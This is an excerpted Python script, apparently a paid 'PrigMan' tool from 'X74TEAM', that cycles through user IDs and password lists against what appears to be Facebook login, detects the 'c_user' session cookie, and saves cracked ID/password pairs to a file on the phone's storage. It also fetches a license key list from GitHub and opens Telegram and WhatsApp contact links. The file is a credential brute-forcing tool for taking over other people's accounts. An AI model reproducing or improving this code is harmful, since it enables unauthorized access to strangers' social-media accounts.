...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.001)
sys.stdout.write('\x1b[1;35m\x1b]2; PrigMan Paid Command \x07')
...
def Main():
	...
	if opt in ["C","3"]:
		...
		fb()
	if opt in ["D","4"]:
		os.system('xdg-open https://wa.me/+8801644811180');time.sleep(1)
		group()
	if opt in ["0","0"]:
		exit()
...
def admin():
	...
	if bal =='2':
		...
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/X74TEAM');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def virusA():
	...
	print(' [💉] Ids saved in PrigMan-OK.txt')
	print(50*'_')
	exit()
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mPrigMan\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'sec-ch-ua-platform': '"Android"',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [PrigMan-OK] '+uid+' | '+ps+'\33[0;92m')
                #print(f'\r\033[1;92m=[💚]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/PrigMan-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def superuser():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/X74TEAM/PrigMan/blob/main/uKey.txt").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        os.system("xdg-open https://t.me/PrigManX")
        time.sleep(3.0)
